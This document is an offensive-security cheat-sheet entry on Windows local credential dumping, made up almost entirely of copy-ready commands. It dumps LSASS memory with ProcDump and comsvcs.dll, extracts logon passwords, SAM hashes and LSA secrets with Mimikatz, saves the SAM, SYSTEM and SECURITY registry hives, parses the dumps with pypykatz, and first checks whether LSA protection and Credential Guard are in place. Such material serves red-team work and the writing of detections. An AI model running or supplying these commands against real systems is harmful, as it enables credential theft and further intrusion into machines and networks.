---
technique: Windows Local Credential Dumping
category: credential-access
targets: LSASS, SAM, SECURITY, SYSTEM
protocols: Local
remote_capable: false
tags: windows credentials lsass sam security system procdump mimikatz hives
---

# Windows Local Credential Dumping

Credential dumping targets LSASS memory and local registry hives. LSASS dumping can expose logon credentials, tickets, and cached secrets. SAM, SECURITY, and SYSTEM hives enable offline extraction of local account hashes and LSA secrets.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Administrative rights | Required for LSASS dumping and protected hive saves |
| EDR awareness | LSASS access and dump tooling are noisy on monitored hosts |
| Offline parser | Hive and minidump files must be parsed with tooling such as secretsdump, pypykatz, or Mimikatz |

## Windows

### Check LSA Protection

#cmd #lsa

Check whether LSASS runs with RunAsPPL protection.

```cmd title:"Check LSA Protection RunAsPPL"
reg query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v RunAsPPL
```
<!-- cheat -->

### Check Credential Guard

#cmd #credential-guard

Check Credential Guard configuration.

```cmd title:"Check Credential Guard LsaCfgFlags"
reg query "HKLM\System\CurrentControlSet\Control\LSA" /v LsaCfgFlags
```
<!-- cheat -->

### Dump LSASS with ProcDump

#cmd #procdump #lsass

Create a full LSASS minidump for offline parsing.

```cmd title:"Dump LSASS with ProcDump"
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
<!-- cheat -->

### Find LSASS PID

#cmd #lsass

Find the LSASS process ID before using PID-based dump methods.

```cmd title:"Find LSASS process ID"
tasklist | findstr lsass
```
<!-- cheat -->

### Dump LSASS with comsvcs.dll

#cmd #lolbin #lsass

Dump LSASS with the built-in `comsvcs.dll` MiniDump export.

```cmd title:"Dump LSASS with comsvcs.dll MiniDump"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\Windows\Temp\lsass.dmp full
```
<!-- cheat
var lsass_pid
-->

### Dump LSASS with Mimikatz minidump

#text #mimikatz #lsass

Load an LSASS minidump in Mimikatz.

```text title:"Load LSASS minidump in Mimikatz"
sekurlsa::minidump lsass.dmp
```
<!-- cheat -->

### Extract logon passwords from minidump

#text #mimikatz #lsass

Extract logon credentials after loading the minidump.

```text title:"Extract logon credentials with Mimikatz"
sekurlsa::logonpasswords
```
<!-- cheat -->

### Save SAM hive

#cmd #registry #sam

Save the SAM hive for offline parsing.

```cmd title:"Save SAM hive"
reg save HKLM\SAM C:\Windows\Temp\sam.save
```
<!-- cheat -->

### Save SYSTEM hive

#cmd #registry #system

Save the SYSTEM hive for offline parsing.

```cmd title:"Save SYSTEM hive"
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
```
<!-- cheat -->

### Save SECURITY hive

#cmd #registry #lsa

Save the SECURITY hive for offline LSA secret parsing.

```cmd title:"Save SECURITY hive"
reg save HKLM\SECURITY C:\Windows\Temp\security.save
```
<!-- cheat -->

### Dump SAM hashes with Mimikatz

#text #mimikatz #sam

Dump local SAM hashes from an elevated Mimikatz context.

```text title:"Dump SAM hashes with Mimikatz"
lsadump::sam
```
<!-- cheat -->

### Dump LSA secrets with Mimikatz

#text #mimikatz #lsa

Dump LSA secrets from an elevated Mimikatz context.

```text title:"Dump LSA secrets with Mimikatz"
lsadump::secrets
```
<!-- cheat -->

## Linux

### Parse LSASS dump with pypykatz

#pypykatz #offline #lsass

Parse an LSASS minidump offline with pypykatz.

```sh title:"Parse LSASS minidump with pypykatz"
pypykatz lsa minidump "$dump_file"
```
<!-- cheat
var dump_file
-->

### Parse LSASS dump to JSON

#pypykatz #offline #lsass

Parse an LSASS minidump and write JSON output.

```sh title:"Parse LSASS minidump to JSON with pypykatz"
pypykatz lsa minidump "$dump_file" -o "$output_file" --json
```
<!-- cheat
var dump_file
var output_file
-->
